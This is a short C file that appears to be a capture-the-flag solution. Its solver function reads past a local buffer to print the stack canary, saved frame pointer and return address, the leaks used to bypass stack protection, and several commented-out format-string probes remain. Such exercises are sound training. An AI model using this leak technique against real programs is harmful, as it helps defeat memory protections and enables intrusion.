#include <stdio.h>

typedef int (*printf_ptr_t)(const char *format, ...);

void solver(printf_ptr_t fptr) {
	char msg[16] = "hello, world!";
	// fptr("%p %p %p %p\n");
	// fptr("%s\n",msg);
	// fptr(" Canary address is : 0x%llx\n",(unsigned long long*)(msg+0x000000000018));
	// fptr(" Canary content is : %llx\n",*(unsigned long long*)(msg+0x000000000018));
	

	//canary = msg adress + 8*3
	//rbp = msg adress + 8*4
	//ret = msg adress + 8*5
	fptr("%llx\n%llx\n%llx\n",*(unsigned long long*)(msg+8*3) , *(unsigned long long*)(msg+8*4) , *(unsigned long long*)(msg+8*5));
	// fptr("%llx\n",*(unsigned long long*)(msg+8*3));
	// fptr("%llx\n",*(unsigned long long*)(msg+8*4));
	// fptr("%llx\n",*(unsigned long long*)(msg+8*5));
	// for(int i = 3 ; i < 6 ; i++){
	// 	// fptr(" Now address is : 0x%llx\n",(unsigned long long*)(msg+8*i));
	// 	fptr("%llx\n",*(unsigned long long*)(msg+8*i));
	// }
}

int main() {
	// char fmt[16] = "** main = %p\n";
	// printf(fmt, main);
	// solver(printf);
	// return 0;
}
